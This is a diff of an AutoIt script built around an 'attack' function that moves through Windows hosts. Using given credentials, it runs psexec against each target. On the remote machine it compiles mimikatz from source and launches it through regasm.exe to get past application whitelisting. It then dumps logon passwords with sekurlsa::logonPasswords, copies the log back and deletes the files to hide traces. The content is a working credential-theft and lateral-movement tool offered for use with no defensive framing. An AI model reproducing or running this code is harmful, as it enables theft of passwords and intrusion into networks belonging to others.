@@ -1,13 +1,7 @@
 #Region ;**** Directives created by AutoIt3Wrapper_GUI ****
-#AutoIt3Wrapper_Res_Fileversion=1.0.0.1
-#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
 #AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
-#AutoIt3Wrapper_Run_Au3Stripper=y
 #EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
-#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
-#AutoIt3Wrapper_Change2CUI=y
-#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
-#include "Cmd.au3"
+
 #include <File.au3>
 #include <GUIConstants.au3>
 
@@ -47,9 +41,6 @@ WEnd
 
 Func attack()
 FileChangeDir(@TempDir)
-
-MsgBox("","","IMPORTANT: Sit back and relax, don't touch the computer until I stuck ;)")
-
 
 FileOpen($list, 0)
 FileDelete("output.txt")
@@ -101,7 +92,7 @@ For $i = 1 to _FileCountLines($osfile)
 	Next
 FileClose($osfile)
 
-RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "installutil.exe" | find /I /V "installutil.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "regasm.exe" | find /I /V "regasm.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)
 
 local $fwfile = "framework.txt"
 FileOpen($fwfile, 0)
@@ -115,53 +106,17 @@ For $i = 1 to _FileCountLines($fwfile)
 FileClose($fwfile)
 
 if $fw Then
-
-$pCmd = Run( "cmd.exe" )
-Sleep(1000)
-$hCmd = _CmdGetWindow( $pCmd )
-SendKeepActive( $hCmd )
-
-If _CmdWaitFor( $hCmd, "Microsoft Corp", Default, Default ) Then
-
-	Send( "echo :cmd123:&&psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&" -s -h cmd.exe" & @CRLF )
-	Sleep(1000)
-
-	If _CmdWaitFor( $hCmd, "\WINDOWS\system32", Default, Default, ":cmd123:") Then
-		Send( "cd c:\windows\temp\" & @CRLF )
-		sleep(1000)
-		Send( "echo :test123:&&\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:mimi.exe /keyfile:key.snk /unsafe katz.cs" & @CRLF )
-
-		If _CmdWaitFor( $hCmd, "All rights reserved", Default, Default, ":test123:") Then
-			sleep(100)
-			Send( "echo :bkp123:&&\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\InstallUtil.exe /U mimi.exe" & @CRLF )
-		If _CmdWaitFor( $hCmd, "mimikatz #", Default, Default, ":bkp123:" ) Then
-			Send( "log" & @CRLF )
-			If _CmdWaitFor( $hCmd, "logfile : OK", Default, Default ) Then
-				Send( "privilege::debug" &@CRLF )
-				If _CmdWaitFor( $hCmd, "Privilege '20' OK", Default, Default ) Then
-					Send( "sekurlsa::logonPasswords full" &@CRLF )
-					sleep(1000)
-					If _CmdWaitFor( $hCmd, "mimikatz #", Default, Default, "logonPasswords" ) Then
-						Send( "exit" &@CRLF )
-						Sleep(1000)
-						RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
-						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
-						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
-						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
-						RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
-						Send( "exit" &@CRLF )
-						Sleep(1000)
-						Send( "exit" &@CRLF )
-					EndIf
-				EndIf
-
-			EndIf
-
-		EndIf
-
-    EndIf
-	EndIf
-EndIf
+RunWait(@ComSpec & " /C " & "echo @echo off > lazy.bat","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:c:\windows\temp\mimi.exe /keyfile:c:\windows\temp\key.snk /unsafe c:\windows\temp\katz.cs >> lazy.bat","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "log c:\windows\temp\mimikatz.log" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h c:\windows\temp\lazy.bat',"",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
+RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\lazy.bat","",@SW_HIDE,0x10000)
 EndIf
 EndIf
 Next
